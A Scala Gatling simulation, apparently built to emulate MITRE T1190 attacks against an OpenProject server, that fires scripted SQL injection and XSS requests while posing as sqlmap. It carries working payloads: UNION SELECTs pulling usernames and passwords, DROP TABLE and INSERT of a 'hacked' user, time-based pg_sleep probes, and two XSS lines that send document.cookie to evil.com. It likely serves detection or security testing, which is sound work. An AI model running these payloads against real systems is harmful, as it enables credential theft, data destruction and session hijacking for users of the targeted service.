package openproject

import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

class T1190_SQLiXSSSimulation extends Simulation {

  val baseUrl = sys.props.getOrElse("baseUrl", "http://localhost:8080")
  val attackDuration = sys.props.getOrElse("duration", "180").toInt.seconds

  val httpProtocol = http
    .baseUrl(baseUrl)
    .acceptHeader("text/html,application/json,*/*")
    .userAgentHeader("sqlmap/1.7.2#stable (https://sqlmap.org)")

  // --- Scenario 1: SQL Injection via search ---
  val sqlInjectionSearch = scenario("T1190 - SQLi Search")
    .exec(http("SQLi - Basic OR").get("/search").queryParam("q", "' OR 1=1--"))
    .pause(500.milliseconds, 1.second)
    .exec(http("SQLi - Union Select").get("/search").queryParam("q", "' UNION SELECT username,password FROM users--"))
    .pause(500.milliseconds, 1.second)
    .exec(http("SQLi - Double Quote").get("/search").queryParam("q", "\" OR \"\"=\""))
    .pause(500.milliseconds)
    .exec(http("SQLi - Sleep Based").get("/search").queryParam("q", "'; WAITFOR DELAY '0:0:5'--"))
    .pause(1.second)
    .exec(http("SQLi - Drop Table").get("/search").queryParam("q", "'; DROP TABLE users;--"))
    .pause(500.milliseconds)
    .exec(http("SQLi - Version Extract").get("/search").queryParam("q", "' UNION SELECT version()--"))
    .pause(1.second)
    .exec(http("SQLi - Batch Stacked").get("/search").queryParam("q", "1; SELECT * FROM information_schema.tables--"))
    .pause(500.milliseconds, 1.second)
    .exec(http("SQLi - Boolean Blind").get("/search").queryParam("q", "' AND 1=1 AND 'a'='a"))
    .pause(1.second)
    .exec(http("SQLi - Hex Encoding").get("/search").queryParam("q", "0x27204f5220313d312d2d"))
    .pause(500.milliseconds)
    .exec(http("SQLi - Comment Bypass").get("/search").queryParam("q", "'/**/OR/**/1=1--"))
    .pause(1.second)

  // --- Scenario 2: SQL Injection via API filters ---
  val sqlInjectionAPI = scenario("T1190 - SQLi API Filters")
    .exec(http("SQLi API - Filter Inject").get("/api/v3/work_packages")
      .queryParam("filters", """[{"status":{"operator":"=","values":["' OR 1=1--"]}}]"""))
    .pause(500.milliseconds, 1.second)
    .exec(http("SQLi API - SortBy Inject").get("/api/v3/work_packages")
      .queryParam("sortBy", """[["subject'; DROP TABLE work_packages;--","asc"]]"""))
    .pause(1.second)
    .exec(http("SQLi API - PageSize Inject").get("/api/v3/work_packages")
      .queryParam("pageSize", "1 UNION SELECT * FROM users"))
    .pause(500.milliseconds)
    .exec(http("SQLi API - Project Filter").get("/api/v3/projects")
      .queryParam("filters", """[{"name":{"operator":"~","values":["' UNION SELECT id,login,mail FROM users--"]}}]"""))
    .pause(1.second)
    .exec(http("SQLi API - User Filter").get("/api/v3/users")
      .queryParam("filters", """[{"login":{"operator":"=","values":["admin' OR '1'='1"]}}]"""))
    .pause(500.milliseconds, 1.second)
    .exec(http("SQLi API - Version Enum").get("/api/v3/versions")
      .queryParam("filters", """[{"name":{"operator":"~","values":["'; SELECT @@version--"]}}]"""))
    .pause(1.second)
    .exec(http("SQLi API - Offset Inject").get("/api/v3/work_packages")
      .queryParam("offset", "0; SELECT pg_sleep(5)"))
    .pause(500.milliseconds)
    .exec(http("SQLi API - Group Inject").get("/api/v3/work_packages")
      .queryParam("groupBy", "type'; INSERT INTO users VALUES('hacked','hacked')--"))
    .pause(1.second)

  // --- Scenario 3: XSS Injection ---
  val xssInjection = scenario("T1190 - XSS Injection")
    .exec(http("XSS - Script Tag").get("/search").queryParam("q", "<script>alert('xss')</script>"))
    .pause(500.milliseconds, 1.second)
    .exec(http("XSS - Img Onerror").get("/search").queryParam("q", "<img src=x onerror=alert(1)>"))
    .pause(500.milliseconds)
    .exec(http("XSS - Iframe Inject").get("/search").queryParam("q", "<iframe src='javascript:alert(1)'>"))
    .pause(1.second)
    .exec(http("XSS - SVG Onload").get("/search").queryParam("q", "<svg/onload=alert('xss')>"))
    .pause(500.milliseconds)
    .exec(http("XSS - Event Handler").get("/search").queryParam("q", "\" onfocus=alert(1) autofocus=\""))
    .pause(1.second)
    .exec(http("XSS - Body Onload").get("/search").queryParam("q", "<body onload=alert('xss')>"))
    .pause(500.milliseconds)
    .exec(http("XSS - Cookie Steal").get("/search").queryParam("q", "<script>document.location='http://evil.com/?c='+document.cookie</script>"))
    .pause(1.second)
    .exec(http("XSS - Input Tag").get("/search").queryParam("q", "\"><input type=text value=xss>"))
    .pause(500.milliseconds, 1.second)
    .exec(http("XSS - Style Inject").get("/projects")
      .queryParam("name", "<style>body{background:url('javascript:alert(1)')}</style>"))
    .pause(1.second)
    .exec(http("XSS - POST Body").post("/search")
      .formParam("q", "<script>fetch('http://evil.com/steal?d='+document.cookie)</script>")
      .check(status.in(200, 302, 400, 403, 404, 422, 500)))
    .pause(500.milliseconds)

  setUp(
    sqlInjectionSearch.inject(atOnceUsers(1)),
    sqlInjectionAPI.inject(nothingFor(3.seconds), atOnceUsers(1)),
    xssInjection.inject(nothingFor(6.seconds), atOnceUsers(1))
  ).protocols(httpProtocol).maxDuration(attackDuration + 30.seconds)
}
